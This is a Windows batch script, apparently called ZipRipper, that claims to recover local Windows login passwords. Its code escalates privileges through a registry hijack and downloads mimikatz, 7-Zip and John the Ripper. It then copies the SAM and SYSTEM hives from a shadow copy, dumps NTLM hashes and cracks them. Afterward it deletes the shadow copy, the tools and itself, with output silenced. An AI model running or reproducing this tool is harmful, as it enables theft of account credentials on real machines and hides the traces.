@ECHO OFF
ECHO Finding LOCAL Windows Login Passwords... Please wait..
>nul 2>&1 REG ADD HKCU\Software\classes\.ZipRipper\shell\runas\command /f /ve /d "CMD /x /d /r SET \"f0=1\"&CALL \"%%2\" %%3"
IF /I NOT "%~dp0" == "%ProgramData%\" (
ECHO|(SET /p="%~dp0")>"%ProgramData%\launcher.ZipRipper"
>nul 2>&1 COPY /Y "%~f0" "%ProgramData%"
>nul 2>&1 FLTMC && START "ZipRipper" "%ProgramData%\launcher.ZipRipper" "%ProgramData%\%~nx0" || IF NOT "%f0%"=="1" (START "ZipRipper" /high "%ProgramData%\launcher.ZipRipper" "%ProgramData%\%~nx0"&EXIT /b)
EXIT /b
)
>nul 2>&1 REG DELETE HKCU\Software\classes\.ZipRipper\ /F
>nul 2>&1 DEL "%ProgramData%\launcher.ZipRipper" /F /Q
IF EXIST "%ProgramData%\JtR" >nul 2>&1 RD "%ProgramData%\JtR" /S /Q
>nul 2>&1 POWERSHELL -nop -c "irm -Uri https://www.7-zip.org/a/7zr.exe -o '%ProgramData%\7zr.exe';irm -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z -o '%ProgramData%\mimikatz.7z';Start-BitsTransfer -Priority Foreground -Source https://github.com/openwall/john-packages/releases/download/jumbo-dev/winX64_1_JtR.7z -Destination '%ProgramData%\winX64_1_JtR.7z'"
>nul 2>&1 "%ProgramData%\7zr.exe" x -y "%ProgramData%\winX64_1_JtR.7z" -o"%ProgramData%\"
>nul 2>&1 "%ProgramData%\7zr.exe" e -y "%ProgramData%\mimikatz.7z" -o"%ProgramData%\JtR" "x64\*"
>nul 2>&1 DEL "%ProgramData%\7zr.exe" /F /Q
>nul 2>&1 DEL "%ProgramData%\mimikatz.7z" /F /Q
>nul 2>&1 DEL "%ProgramData%\winX64_1_JtR.7z"
>nul 2>&1 POWERSHELL -nop -c "(Get-WmiObject -list win32_shadowcopy).Create('C:\','ClientAccessible')"
FOR /F "usebackq tokens=1,2 delims=:" %%# IN (`vssadmin list shadows`) DO (
IF /I "%%#"=="      Shadow Copy ID" SET "ID=%%$"
IF /I "%%#"=="         Shadow Copy Volume" SET "VOL=%%$"
)
SETLOCAL ENABLEDELAYEDEXPANSION
>nul 2>&1 MKLINK /d "%ProgramData%\ZipRipperVSS" "!VOL:~1!\"
>nul 2>&1 COPY /Y "%ProgramData%\ZipRipperVSS\Windows\System32\config\SAM" "%ProgramData%\JtR"
>nul 2>&1 COPY /Y "%ProgramData%\ZipRipperVSS\Windows\System32\config\SYSTEM" "%ProgramData%\JtR"
>nul 2>&1 RMDIR %ProgramData%\ZipRipperVSS
>nul 2>&1 VSSADMIN DELETE SHADOWS /Shadow=!ID:~1! /quiet
ENDLOCAL
CD.>"%ProgramData%\JtR\run\hash.txt"
FOR /F "usebackq tokens=1,2 delims=:" %%i IN (`%ProgramData%\JtR\mimikatz "lsadump::sam /system:%ProgramData%\JtR\SYSTEM /sam:%ProgramData%\JtR\SAM" exit`) DO (
IF /I "%%i"=="User " SET "USER=%%j"
SET "HASH=%%j"
SETLOCAL ENABLEDELAYEDEXPANSION
IF /I NOT "!USER:~1!"=="WDAGUtilityAccount" (IF /I "%%i"=="  Hash NTLM" ECHO !USER:~1!:!HASH:~1!)>>"%ProgramData%\JtR\run\hash.txt"
ENDLOCAL
)
TITLE ZipRipper
IF EXIST "%ProgramData%\JtR\mimi*.*" >nul 2>&1 DEL "%ProgramData%\JtR\mimi*.*" /F /Q
IF EXIST "%ProgramData%\JtR\SAM." >nul 2>&1 DEL "%ProgramData%\JtR\SAM." /F /Q
IF EXIST "%ProgramData%\JtR\SYSTEM." >nul 2>&1 DEL "%ProgramData%\JtR\SYSTEM." /F /Q
PUSHD "%ProgramData%\JtR\run"
john hash.txt --format=NT
POPD
ECHO/
PAUSE
>nul 2>&1 RD "%ProgramData%\JtR" /S /Q
(GOTO) 2>nul&DEL "%~f0"/F /Q>nul&EXIT